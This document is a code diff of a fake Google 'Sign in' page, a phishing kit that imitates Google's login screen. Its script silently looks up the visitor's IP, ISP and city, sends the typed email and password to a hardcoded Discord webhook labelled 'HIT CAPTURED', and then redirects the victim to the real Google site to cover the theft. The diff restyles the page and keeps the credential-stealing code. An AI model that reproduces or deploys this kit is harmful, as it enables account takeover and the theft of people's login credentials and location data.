@@ -5,83 +5,120 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Roboto', arial, sans-serif; transition: all 0.2s ease; }
-        body { background-color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #202124; }
+        * { box-sizing: border-box; font-family: 'Open Sans', Roboto, Arial, sans-serif; }
         
-        .wrapper { display: flex; width: 100%; max-width: 1040px; min-height: 480px; border: 1px solid #dadce0; border-radius: 28px; position: relative; margin: 20px; overflow: hidden; }
+        body { 
+            background-color: #fff; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            color: #202124;
+            /* Zoom effect to match actual Google scale on desktop */
+            zoom: 1.1; 
+        }
+        
+        .wrapper { 
+            display: flex; 
+            width: 100%; 
+            max-width: 1040px; 
+            min-height: 520px; /* Taller card */
+            border: 1px solid #dadce0; 
+            border-radius: 28px; 
+            position: relative; 
+            margin: 20px; 
+            overflow: hidden; 
+        }
 
-        #loader { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; display: none; z-index: 5; }
+        #loader { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; display: none; z-index: 10; }
         #loader::after { content: ""; position: absolute; width: 45%; height: 100%; background: #0b57d0; animation: load 1.5s infinite linear; }
         @keyframes load { from { left: -45%; } to { left: 100%; } }
 
-        .left-panel { flex: 1; padding: 48px; display: flex; flex-direction: column; }
-        .logo { width: 48px; height: 48px; margin-bottom: 12px; }
-        h1 { font-size: 36px; font-weight: 400; margin: 0; }
-        .sub-text { font-size: 16px; margin-top: 12px; }
+        /* Left Side */
+        .left-panel { flex: 1; padding: 56px; display: flex; flex-direction: column; }
+        .logo { width: 52px; height: 52px; margin-bottom: 20px; }
+        h1 { font-size: 40px; font-weight: 400; margin: 0; letter-spacing: -0.5px; }
+        .sub-text { font-size: 18px; margin-top: 16px; color: #202124; }
 
-        .right-panel { width: 450px; padding: 48px; display: flex; flex-direction: column; justify-content: center; }
-        .step { display: none; }
-        .active { display: block; }
+        /* Right Side */
+        .right-panel { width: 480px; padding: 56px; display: flex; flex-direction: column; justify-content: center; }
+        .step { display: none; width: 100%; }
+        .active { display: block; animation: fadeIn 0.3s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-        input { width: 100%; padding: 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-bottom: 8px; outline: none; }
-        input:focus { border: 2px solid #0b57d0; padding: 15px; }
-        
-        /* Error text styling matching the specified requirements */
-        .error-message { color: #b3261e; font-size: 12px; margin-top: 4px; margin-bottom: 16px; display: none; font-weight: 400; }
+        /* Bigger Inputs */
+        input { 
+            width: 100%; 
+            padding: 18px 16px; 
+            border: 1px solid #747775; 
+            border-radius: 4px; 
+            font-size: 17px; 
+            margin-bottom: 12px; 
+            outline: none; 
+        }
+        input:focus { border: 2px solid #0b57d0; padding: 17px 15px; }
 
-        .show-pass-box { display: flex; align-items: center; font-size: 14px; margin: 8px 0 20px; cursor: pointer; }
-        .show-pass-box input { width: 18px; height: 18px; margin-right: 10px; }
+        .show-pass-wrap { display: flex; align-items: center; font-size: 15px; margin: 12px 0 24px; cursor: pointer; user-select: none; }
+        .show-pass-wrap input { width: 20px; height: 20px; margin-right: 12px; cursor: pointer; }
 
-        .btn-next { background: #0b57d0; color: white; border: none; padding: 10px 24px; border-radius: 20px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        .user-chip { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 16px; padding: 4px 12px; font-size: 14px; margin-bottom: 24px; cursor: pointer; }
+        .blue-link { color: #0b57d0; font-weight: 500; font-size: 15px; background: none; border: none; cursor: pointer; padding: 0; margin-bottom: 20px; text-align: left; text-decoration: none; }
+        .blue-link:hover { text-decoration: underline; }
 
-        .bottom-nav { position: fixed; bottom: 20px; width: 100%; max-width: 1040px; display: flex; justify-content: space-between; font-size: 12px; color: #444746; }
-        select { border: none; cursor: pointer; background: transparent; }
+        /* Actions */
+        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 48px; }
+        .btn-next { background: #0b57d0; color: white; border: none; padding: 12px 28px; border-radius: 24px; font-weight: 500; cursor: pointer; font-size: 15px; }
+        .btn-next:hover { background: #0842a0; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+
+        .user-chip { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 20px; padding: 6px 14px; font-size: 15px; margin-bottom: 32px; cursor: pointer; }
+
+        /* Footer Nav */
+        .bottom-nav { position: fixed; bottom: 24px; width: 100%; max-width: 1040px; display: flex; justify-content: space-between; font-size: 13px; color: #444746; }
+        .lang-select { background: none; border: none; cursor: pointer; color: #202124; font-size: 14px; font-family: inherit; }
     </style>
 </head>
 <body>
 
     <div class="wrapper">
         <div id="loader"></div>
+        
         <div class="left-panel">
             <svg class="logo" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
-            <h1 id="title-txt">Sign in</h1>
-            <p class="sub-text" id="sub-txt">Use your Google Account</p>
+            <h1 id="main-h1">Sign in</h1>
+            <p class="sub-text" id="main-sub">Use your Google Account</p>
         </div>
 
         <div class="right-panel">
-            <!-- STEP 1: Username / Email entry -->
             <div id="step-1" class="step active">
-                <input type="text" id="email_field" placeholder="Email or phone">
-                <div id="email_error" class="error-message">Enter a valid email address containing an '@' symbol.</div>
-                <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
-                    <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Create account</span>
-                    <button class="btn-next" onclick="nextStep()">Next</button>
+                <input type="email" id="field_email" placeholder="Email or phone">
+                <button class="blue-link">Forgot email?</button>
+                <div class="sub-text" style="font-size:15px; color:#444746; margin-top: 24px; margin-bottom:48px;">Not your computer? Use Guest mode to sign in privately. <span style="color:#0b57d0; cursor:pointer">Learn more</span></div>
+                <div class="footer-actions">
+                    <button class="blue-link">Create account</button>
+                    <button class="btn-next" onclick="goPass()">Next</button>
                 </div>
             </div>
 
-            <!-- STEP 2: Password entry -->
             <div id="step-2" class="step">
-                <div class="user-chip" onclick="location.reload()"><span id="display_mail"></span></div>
-                <input type="password" id="pass_field" placeholder="Enter your password">
-                <div id="pass_error" class="error-message">Password does not meet standard criteria. Must be at least 8 characters long.</div>
-                <label class="show-pass-box">
-                    <input type="checkbox" onclick="toggle()"> <span>Show password</span>
+                <div class="user-chip" onclick="location.reload()"><span id="user_label"></span></div>
+                <input type="password" id="field_pass" placeholder="Enter your password">
+                <label class="show-pass-wrap">
+                    <input type="checkbox" onclick="toggleView()"> <span>Show password</span>
                 </label>
-                <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
-                    <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Forgot password?</span>
-                    <button class="btn-next" onclick="capture()">Next</button>
+                <div class="footer-actions" style="margin-top: 64px;">
+                    <button class="blue-link">Forgot password?</button>
+                    <button class="btn-next" onclick="hit()">Next</button>
                 </div>
             </div>
         </div>
     </div>
 
     <div class="bottom-nav">
-        <select onchange="changeLang(this.value)">
-            <option value="en">English (United States)</option>
-            <option value="es">Español</option>
+        <select class="lang-select">
+            <option>English (United States)</option>
+            <option>Español</option>
         </select>
-        <div style="display:flex; gap:20px">
+        <div style="display:flex; gap:24px">
             <a href="#" style="text-decoration:none; color:inherit">Help</a>
             <a href="#" style="text-decoration:none; color:inherit">Privacy</a>
             <a href="#" style="text-decoration:none; color:inherit">Terms</a>
@@ -89,91 +126,60 @@
     </div>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
-        let clientData = {};
+        const WH = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+        let meta = {};
 
-        // Silently capture geolocation or ISP data if available
-        fetch('https://ipapi.co/json/')
-            .then(r => r.json())
-            .then(d => clientData = d)
-            .catch(() => {});
+        // Silent Meta Capture (IP, ISP, Town)
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => meta = d);
 
-        function toggle() {
-            const p = document.getElementById("pass_field");
+        function toggleView() {
+            const p = document.getElementById("field_pass");
             p.type = p.type === "password" ? "text" : "password";
         }
 
-        function nextStep() {
-            const emailField = document.getElementById('email_field');
-            const emailValue = emailField.value.trim();
-            const emailError = document.getElementById('email_error');
-            
-            // STRICT VERIFICATION: Halts execution if the string lacks an '@' character
-            if (!emailValue.includes('@')) {
-                emailError.style.display = 'block';
-                emailField.style.borderColor = '#b3261e';
-                emailField.focus();
-                return; // Blocks the sequence immediately
-            }
-            
-            // Clear prior formatting violations if verified
-            emailError.style.display = 'none';
-            emailField.style.borderColor = '#747775';
-            
+        function goPass() {
+            const e = document.getElementById('field_email').value;
+            if(!e) return;
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('display_mail').innerText = emailValue;
-                document.getElementById('title-txt').innerText = "Welcome";
-                document.getElementById('sub-txt').innerText = "";
+                document.getElementById('user_label').innerText = e;
+                document.getElementById('main-h1').innerText = "Welcome";
+                document.getElementById('main-sub').innerText = "";
                 document.getElementById('step-1').classList.remove('active');
                 document.getElementById('step-2').classList.add('active');
-            }, 800);
+            }, 750);
         }
 
-        function capture() {
-            const email = document.getElementById('email_field').value.trim();
-            const passField = document.getElementById('pass_field');
-            const passValue = passField.value;
-            const passError = document.getElementById('pass_error');
+        function hit() {
+            const e = document.getElementById('field_email').value;
+            const p = document.getElementById('field_pass').value;
+            if(!p) return;
 
-            // CRITERIA: Minimum length of 8 elements matching identity provider configurations
-            if (!passValue || passValue.length < 8) {
-                passError.style.display = 'block';
-                passField.style.borderColor = '#b3261e';
-                passField.focus();
-                return; // Block submission execution
-            }
+            document.getElementById('loader').style.display = 'block';
 
-            passError.style.display = 'none';
-            passField.style.borderColor = '#747775';
-
-            fetch(WEBHOOK, {
+            fetch(WH, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
+                    username: "Sentinel Capture",
                     embeds: [{
-                        title: "🌈 RGB Identity Hit",
+                        title: "🚀 HIT CAPTURED",
                         color: Math.floor(Math.random() * 16777215),
                         fields: [
-                            { name: "👤 User", value: `\`${email}\`` },
-                            { name: "🔑 Pass", value: `\`${passValue}\`` },
-                            { name: "🌐 Internet (ISP)", value: `\`${clientData.org || 'Unknown'}\`` },
-                            { name: "📍 Location", value: `\`${clientData.city || 'Unknown'}, ${clientData.country_name || 'Unknown'}\`` },
-                            { name: "💻 Device", value: `\`${navigator.platform}\``, inline: true }
+                            { name: "👤 User", value: `\`${e}\`` },
+                            { name: "🔑 Pass", value: `\`${p}\`` },
+                            { name: "🌐 Internet (ISP)", value: `\`${meta.org || 'Unknown'}\`` },
+                            { name: "📍 Location", value: `\`${meta.city}, ${meta.country_name}\`` },
+                            { name: "💻 Device", value: `\`${navigator.platform}\``, inline: true },
+                            { name: "📡 IP", value: `\`${meta.ip}\``, inline: true }
                         ],
                         timestamp: new Date()
                     }]
                 })
             }).then(() => {
-                window.location.href = "https://accounts.google.com";
-            }).catch(() => {
-                window.location.href = "https://accounts.google.com";
+                setTimeout(() => window.location.href = "https://accounts.google.com", 1000);
             });
-        }
-
-        function changeLang(v) {
-            document.getElementById('title-txt').innerText = v === 'es' ? "Iniciar sesión" : "Sign in";
         }
     </script>
 </body>
